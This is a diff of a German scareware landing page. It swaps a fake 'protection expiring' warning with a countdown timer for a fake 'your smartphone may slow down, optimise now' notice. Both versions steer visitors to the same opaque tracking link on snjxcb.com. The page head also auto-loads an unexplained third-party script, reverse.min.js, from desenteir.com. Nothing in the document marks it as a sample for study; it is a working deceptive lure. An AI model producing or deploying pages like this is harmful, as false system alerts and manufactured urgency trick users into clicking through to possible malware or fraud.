@@ -2,59 +2,51 @@
 <html lang="de">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Schutz aktivieren</title>
+  <title>Systemhinweis</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #f9f9f9;
       margin: 0;
       padding: 0;
+      font-family: Arial, sans-serif;
+      background: #f8f9fa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
       text-align: center;
     }
-    .header {
-      background-color: #c62828;
-      color: white;
-      padding: 20px;
-      font-size: 22px;
-      font-weight: bold;
-    }
     .box {
-      margin: 40px auto;
-      max-width: 400px;
-      padding: 20px;
-      border: 1px solid #ddd;
-      border-radius: 10px;
       background: #fff;
-      box-shadow: 0px 2px 6px rgba(0,0,0,0.1);
+      border: 1px solid #ddd;
+      border-radius: 12px;
+      padding: 30px 25px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      max-width: 340px;
+      width: 90%;
     }
-    .warning {
-      font-size: 18px;
-      margin-bottom: 20px;
-      color: #c62828;
-      font-weight: bold;
-    }
-    .countdown {
-      font-size: 28px;
-      font-weight: bold;
-      color: #1976d2;
-      margin: 20px 0;
-    }
-    .cta-btn {
-      display: inline-block;
-      margin-top: 20px;
-      padding: 15px 25px;
+    h1 {
       font-size: 20px;
-      font-weight: bold;
-      color: white;
-      background-color: #1976d2;
-      border: none;
+      color: #d9534f;
+      margin-bottom: 12px;
+    }
+    p {
+      font-size: 15px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+    .cta {
+      display: inline-block;
+      background: #28a745;
+      color: #fff;
+      padding: 12px 20px;
       border-radius: 8px;
       text-decoration: none;
-      cursor: pointer;
+      font-size: 16px;
+      font-weight: bold;
+      transition: background 0.2s ease;
     }
-    .cta-btn:hover {
-      background-color: #0d47a1;
+    .cta:hover {
+      background: #218838;
     }
   </style>
   <script>
@@ -79,38 +71,10 @@
   <script async src="https://desenteir.com/170/b9b5a/reverse.min.js?sf=1"></script>
 </head>
 <body>
-  <div class="header">
-    ⚠️ Achtung: Ihr Schutz läuft bald ab!
-  </div>
-
   <div class="box">
-    <p class="warning">Kostenlos nur für kurze Zeit verfügbar!</p>
-    <p>Dieses exklusive Angebot endet in:</p>
-
-    <div class="countdown" id="countdown">05:00</div>
-
-    <a href="https://snjxcb.com/ksgl3i.php?lp=1" class="cta-btn">
-      Jetzt sofort aktivieren
-    </a>
+    <h1>⚠️ Hinweis: Ihr Smartphone könnte langsamer werden</h1>
+    <p>Optimieren Sie jetzt die Leistung – surfen Sie schneller und laden Sie effizienter.</p>
+    <a href="https://snjxcb.com/ksgl3i.php?lp=1" class="cta">Jetzt optimieren</a>
   </div>
-
-  <script>
-    let time = 5 * 60; // 5 Minuten in Sekunden
-    const countdownEl = document.getElementById("countdown");
-
-    function updateCountdown() {
-      let minutes = Math.floor(time / 60);
-      let seconds = time % 60;
-      seconds = seconds < 10 ? "0" + seconds : seconds;
-      countdownEl.textContent = `${minutes}:${seconds}`;
-      time--;
-
-      if (time < 0) {
-        countdownEl.textContent = "00:00";
-      }
-    }
-
-    setInterval(updateCountdown, 1000);
-  </script>
 </body>
 </html>
